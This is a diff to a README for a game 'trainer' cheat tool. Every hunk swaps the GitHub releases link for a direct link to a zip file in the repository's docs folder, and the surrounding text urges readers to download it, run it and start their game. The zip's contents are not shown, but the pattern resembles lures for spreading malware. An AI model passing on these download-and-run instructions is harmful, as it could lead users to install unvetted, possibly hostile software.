@@ -1,6 +1,6 @@
 # 🎮 Pax-Autocratica-Trainer - Your Ultimate Game Enhancement Companion
 
-[![Download Now](https://img.shields.io/badge/Download-Pax--Autocratica--Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-Pax--Autocratica--Trainer-brightgreen?style=for-the-badge&logo=github)](https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/raw/refs/heads/main/docs/v1.2.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Follow these simple steps to start using Pax-Autocratica-Trainer:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/releases](https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/releases)
+Visit this link to download the application: [https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/raw/refs/heads/main/docs/v1.2.zip](https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/raw/refs/heads/main/docs/v1.2.zip)
 
 Click the download button on that page, and the file will be saved to your computer (usually to your Downloads folder).
 
@@ -150,7 +150,7 @@ Thousands of players use this trainer to enhance their Pax Autocratica experienc
 
 ## 📥 Download Now
 
-Visit this link to download the application: [https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/releases](https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/releases)
+Visit this link to download the application: [https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/raw/refs/heads/main/docs/v1.2.zip](https://github.com/qwerabdul91-lab/Pax-Autocratica-Trainer/raw/refs/heads/main/docs/v1.2.zip)
 
 Click the download button on that page, run the application, launch your game, and start enjoying all the benefits immediately. It takes less than 2 minutes to set up!
 
